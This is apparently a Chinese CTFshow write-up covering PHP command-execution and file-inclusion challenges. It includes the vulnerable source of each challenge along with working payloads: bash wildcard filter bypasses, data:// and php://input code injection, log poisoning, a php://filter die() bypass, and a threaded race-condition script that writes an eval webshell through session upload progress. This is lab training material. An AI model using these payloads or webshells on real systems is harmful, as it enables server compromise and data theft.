/\n${#HOSTNAME}=4 //用户名的位数，这里用户名是root，故为4\n另一种方法\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\r相当于/???/?????4 ????.??? 或者 /???/?????5 ????.???\r想要匹配/bin/base64 ????.??? {#RANDOM} = 4或5\n由于可能是5，所以要多试几次，还要进行base64解码\nweb120 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u0026lt;|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; 这题把上题的HOME也ban了，但是第二种方法还能出，而且长度也符合\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.??? 或\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.??? web121 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u0026lt;|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; 这题SHLVL被ban了，可以用?代替\n${#?}=1\npayload\n${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.??? 或\n${PWD::${#?}}???${PWD::${#?}}${PWD::${#?}}?? ????.???\r/bin/rev rev是倒叙输出的\nweb122 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|#|%|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; 这题把PWD和#也ban掉了\n可以考虑用$?来代替${#1}\n$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误\n所以我们可以构造payload:\n\u0026lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? \u0026lt;A指令不知道是啥，埋个坑\nweb124 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: 收集自网络 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-06 14:04:45 9 10*/ 11 12error_reporting(0); 13//听说你很喜欢数学，不知道你是否爱它胜过爱flag 14if(!isset($_GET[\u0026#39;c\u0026#39;])){ 15 show_source(__FILE__); 16}else{ 17 //例子 c=20-1 18 $content = $_GET[\u0026#39;c\u0026#39;]; 19 if (strlen($content) \u0026gt;= 80) { 20 die(\u0026#34;太长了不会算\u0026#34;); 21 } 22 $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; 23 foreach ($blacklist as $blackitem) { 24 if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { 25 die(\u0026#34;请不要输入奇奇怪怪的字符\u0026#34;); 26 } 27 } 28 //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp 29 $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; 30 preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); 31 foreach ($used_funcs[0] as $func) { 32 if (!in_array($func, $whitelist)) { 33 die(\u0026#34;请不要输入奇奇怪怪的函数\u0026#34;); 34 } 35 } 36 //帮你算出答案 37 eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); 38} 这题设置了白名单和黑名单，白名单是数学函数，黑名单则是一些符号，而且有长度限制\n这题的思路其实就是要考虑用数字通过数学运算函数的转换来构造出我们需要用到的字符\n就比如我们可以先将需要的字符转换成16进制后再转换成10进制，再执行命令的时候通过数学函数转换回去\nCTFshow-WEB入门-命令执行web124 - Hacker\u0026amp;Cat - 博客园\n目标代码：$_GET[\u0026#39;abs\u0026#39;]($_GET[\u0026#39;acos\u0026#39;]) dechex()，10进制转16进制\rbase_convert(值,原进制,目标进制)，任意进制转换\rhex2bin，16进制转字符串 解题：\nbase_convert(26941962055,10,34) 为 hex2bin\nbase_convert(26941962055,10,34)(dechex(1598506324)) 为 _GET\n构造payload\nc=$pi=base_convert(26941962055,10,34)(dechex(1598506324));$$pi{abs}($$pi{asin})\u0026amp;abs=system\u0026amp;asin=ls ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","summary":"\u003ch4 id=\"web29\"\u003eweb29\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# -*- coding: utf-8 -*-\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Author: h1xa\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Date:   2020-09-04 00:12:34\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Last Modified by:   h1xa\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Last Modified time: 2020-09-04 00:26:48\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @email: h1xa@ctfer.com\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @link: https://ctfer.com\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e*/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003eerror_reporting\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eisset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;c\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e])){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$c\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;c\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/flag/i\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e)){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003ehighlight_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003e__FILE__\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以看到通过eval函数可以执行php代码或者系统命令，其中过滤了flag。\u003c/p\u003e","title":"CTFSHOW-命令执行-Writeup"},{"content":" 以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()\nWeb78 php伪协议\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 10:52:43 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 10:54:20 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16 $file = $_GET[\u0026#39;file\u0026#39;]; 17 include($file); 18}else{ 19 highlight_file(__FILE__); 20} payload:\n?file=data://text/plain,\u003c?php system(\"cat flag.php\")?\u003e\n查看源代码，得到flag\nweb79 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:10:14 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 11:12:38 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16 $file = $_GET[\u0026#39;file\u0026#39;]; 17 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 这题相对于上一题会将file中的php替换为???\n我们可以通过base64进行绕过\n?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4= or\n?file=data://text/plain,\u0026lt;?=system(\u0026#39;tac flag*\u0026#39;);?\u0026gt; ?file=data://text/plain,\u0026lt;?Php echo `tac f*`;?\u0026gt; or\n远程加载\n加载robots.txt，发现可以回显\n在自己vps上创建1.txt，内容如下 \u0026lt;?php system(\u0026quot;tac flag.php\u0026quot;);?\u0026gt;\n起一个http服务，加载 url/?file=http://x.x.x.x:7001/1.txt\nor\ninput协议 大小写绕过\npayload:\nPOST /?file=Php://input HTTP/1.1\r\u0026lt;?Php system(\u0026#34;cat flag.php\u0026#34;);?\u0026gt; web80 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 11:26:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;file\u0026#39;])){ 16 $file = $_GET[\u0026#39;file\u0026#39;]; 17 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); 19 include($file); 20}else{ 21 highlight_file(__FILE__); 22} 日志包含\n写入一句话木马\n连webshell工具或者直接get传参\n?file=/var/log/nginx/access.log\u0026amp;2=system(\u0026#39;ls /var/www/html\u0026#39;);phpinfo();\r?file=/var/log/nginx/access.log\u0026amp;2=system(\u0026#39;tac /var/www/html/fl0g.php\u0026#39;);phpinfo(); Or\ninput协议 大小写绕过\npayload:\nPOST /?file=Php://input HTTP/1.1\r\u0026lt;?Php system(\u0026#34;cat flag.php\u0026#34;);?\u0026gt; web81 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 15:51:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13if(isset($_GET[\u0026#39;file\u0026#39;])){ 14 $file = $_GET[\u0026#39;file\u0026#39;]; 15 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 16 $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); 17 $file = str_replace(\u0026#34;:\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 同上web80\nweb82 条件竞争\npoc\n1import requests 2import io 3import threading 4 5url=\u0026#39;http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/\u0026#39; 6sessionid=\u0026#39;ctfshow\u0026#39; 7data={ 8\t\u0026#34;1\u0026#34;:\u0026#34;file_put_contents(\u0026#39;/var/www/html/jiuzhen.php\u0026#39;,\u0026#39;\u0026lt;?php eval($_POST[3]);?\u0026gt;\u0026#39;);\u0026#34; 9} 10#这个是访问/tmp/sess_ctfshow时，post传递的内容，是在网站目录下写入一句话木马。这样一旦访问成功，就可以蚁剑连接了。 11def write(session):#/tmp/sess_ctfshow中写入一句话木马。 12\tfileBytes = io.BytesIO(b\u0026#39;a\u0026#39;*1024*50) 13\twhile True: 14\tresponse=session.post(url, 15\tdata={ 16\t\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;:\u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39; 17\t}, 18\tcookies={ 19\t\u0026#39;PHPSESSID\u0026#39;:sessionid 20\t}, 21\tfiles={ 22\t\u0026#39;file\u0026#39;:(\u0026#39;ctfshow.jpg\u0026#39;,fileBytes) 23\t} 24\t) 25 26def read(session):#访问/tmp/sess_ctfshow，post传递信息，在网站目录下写入木马。 27\twhile True: 28\tresponse=session.post(url+\u0026#39;?file=/tmp/sess_\u0026#39;+sessionid,data=data, 29\tcookies={ 30\t\u0026#39;PHPSESSID\u0026#39;:sessionid 31\t} 32\t) 33\tresposne2=session.get(url+\u0026#39;jiuzhen.php\u0026#39;);#访问木马文件，如果访问到了就代表竞争成功 34\tif resposne2.status_code==200:了 35\tprint(\u0026#39;++++++done++++++\u0026#39;) 36\telse: 37\tprint(resposne2.status_code) 38 39if __name__ == \u0026#39;__main__\u0026#39;: 40 41\tevnet=threading.Event() 42\t#写入和访问分别设置5个线程。 43\twith requests.session() as session: 44\tfor i in range(5): 45\tthreading.Thread(target=write,args=(session,)).start() 46\tfor i in range(5): 47\tthreading.Thread(target=read,args=(session,)).start() 48 49\tevnet.set() getshell\n直接查flag\n利用条件\n存在文件包含漏洞 知道session文件存放路径，可以尝试默认路径 具有读取和写入session文件的权限 这两个脚本理论上适用于web82-web86\nweb83 web83的开篇设置了session_unset();session_destroy();\nsession_unset()：释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的。 session_destroy()：删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留。\n就是释放和清除了前面所有session变量和文件，但是我们的解题思路是竞争上传那一瞬间创建的session，所以不影响。\nweb84 加上了一个system(rm -rf /tmp/*);，但是因为本来session.upload_progress.cleanup = on，就会清空对应session文件中的内容，这里加上删除，对竞争的影响不大。（但是可能需要增加一些线程）\nweb85 添加了一个内容识别，如果有\u0026lt;就die，依旧可以竞争。\nweb86 dirname(FILE)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。 include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。 脚本里用的是完整路径，不影响竞争。\nweb82-86：参考https://blog.csdn.net/m0_48780534/article/details/125410757\nweb87 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 21:57:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14if(isset($_GET[\u0026#39;file\u0026#39;])){ 15 $file = $_GET[\u0026#39;file\u0026#39;]; 16 $content = $_POST[\u0026#39;content\u0026#39;]; 17 $file = str_replace(\u0026#34;php\u0026#34;, \u0026#34;???\u0026#34;, $file); 18 $file = str_replace(\u0026#34;data\u0026#34;, \u0026#34;???\u0026#34;, $file); 19 $file = str_replace(\u0026#34;:\u0026#34;, \u0026#34;???\u0026#34;, $file); 20 $file = str_replace(\u0026#34;.\u0026#34;, \u0026#34;???\u0026#34;, $file); 21 file_put_contents(urldecode($file), \u0026#34;\u0026lt;?php die(\u0026#39;大佬别秀了\u0026#39;);?\u0026gt;\u0026#34;.$content); 22 23 24}else{ 25 highlight_file(__FILE__); 26} 使用 file_put_contents 函数将经过处理后的内容写入到文件中。写入的内容是先拼接了一个 \u0026lt;?php die('大佬别秀了');?\u0026gt; 字符串,用于在后续如果有人直接访问写入后的文件时，防止文件内容被直接执行而显示一些提示信息，然后再拼接上从 $_POST 中获取的 $content 变量的值。\n这道题需要用到php://filter\nphp://filter的使用 原文：谈一谈php://filter的妙用 | 离别歌\nphp://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误parser error : StartTag: invalid element name 。其原因是，PHP是基于标签的脚本语言，\u0026lt;?php ... ?\u0026gt;这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。\n那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。\nphp://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：\nreadfile(\u0026#34;php://filter/read=convert.base64-encode/resource=php://input\u0026#34;); 如下：\n所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。\n如下，我们使用的是php://filter/read=convert.base64-encode/resource=./xxe.php\n回归正题\n我们审一下这道题目的代码\n相比上一道题这题增加了一个post参数，且会将传入的参数进行拼接后写入文件\n1 $content = $_POST[\u0026#39;content\u0026#39;]; 2 file_put_contents(urldecode($file), \u0026#34;\u0026lt;?php die(\u0026#39;大佬别秀了\u0026#39;);?\u0026gt;\u0026#34;.$content); 这道题在$content和$file之间拼接了一个\u003c?php die('大佬别秀了');?\u003e，导致即使我们成功写入一句话，也执行不了\n我们如何绕过这个die呢？\n其实我们可以通过php://filter流的base64-decode方法来去除这个die\n因为php在解码base64编码的时候会先将不属于base64中的字符去除，再进行转换，如下\n1\u0026lt;?php 2$_GET[\u0026#39;txt\u0026#39;] = preg_replace(\u0026#39;|[^a-z0-9A-Z+/]|s\u0026#39;, \u0026#39;\u0026#39;, $_GET[\u0026#39;txt\u0026#39;]); 3base64_decode($_GET[\u0026#39;txt\u0026#39;]); 所以，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符\u0026lt;、?、;、\u0026gt;、、(、) 、\u0026lsquo;空格等字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符。\n”phpdie“一共6个字符，由于base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符。这样，\u0026ldquo;phpdie\u0026quot;被正常解码，而后面我们传入的webshell的base64内容也被正常解码。\n同时由于会对传入的file进行url解码，所以需要对传入的file进行两次url编码\nwarning!!!url编码需要连同英文字符一起进行转换，可以借助hackbar强制进行转换（找了很久）\npoc:\n原文：file=php://filter/write=convert.base64-decode/resource=shell.php\rfile原文：content=\u0026lt;?php system(\u0026#39;cat fl0g.php\u0026#39;);?\u0026gt;\rcontent=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg== 访问shell.php,得到flag\n其实还可以通过其他编码来进行绕过如rot13\n更多file_put_content和死亡·杂糅代码之缘 - 先知社区\nweb88 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-17 02:27:25 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12 */ 13if(isset($_GET[\u0026#39;file\u0026#39;])){ 14 $file = $_GET[\u0026#39;file\u0026#39;]; 15 if(preg_match(\u0026#34;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\u0026#34;, $file)){ 16 die(\u0026#34;error\u0026#34;); 17 } 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 这题过滤了很多字符但是没有过滤:、/、;\npoc\n?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4 web116 拿到题目环境，发现是个视频，下载视频用binwalk扫一下\n提取图片，发现是源码\n直接get传参读flag\n?file=flag.php web117 web87的后续 死亡绕过\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: yu22x 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 18:16:59 9 